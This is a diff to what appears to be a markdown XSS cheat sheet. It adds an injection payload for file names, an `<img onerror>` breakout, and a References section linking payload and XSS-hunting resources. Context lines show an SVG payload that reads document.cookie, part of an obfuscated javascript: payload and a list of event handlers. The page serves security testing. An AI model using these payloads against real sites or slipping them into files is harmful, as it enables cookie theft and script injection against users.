@@ -1,9 +1,5 @@
 # Cross-Site Scripting (XSS)
 
-{% embed url="https://github.com/vkbiu/KNR-XSS-Payloads" %}
-XSS Payloads Repository
-{% endembed %}
-
 ### XSS inside SVG File
 
 ```markup
@@ -16,6 +12,12 @@ XSS Payloads Repository
 		alert(document.cookie);
 	</script>
 </svg>
+```
+
+### XSS in filename
+
+```
+"><img src=x onerror=prompt(1).jpg
 ```
 
 ### Weird Payloads
@@ -257,3 +259,13 @@ javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!�
 "onwebkittransitionend",
 "onwheel"
 ```
+
+### References
+
+{% embed url="https://xsshunter.com" %}
+Platform to hunt XSS vulnerabilities
+{% endembed %}
+
+{% embed url="https://github.com/vkbiu/KNR-XSS-Payloads" %}
+XSS Payloads Repository
+{% endembed %}
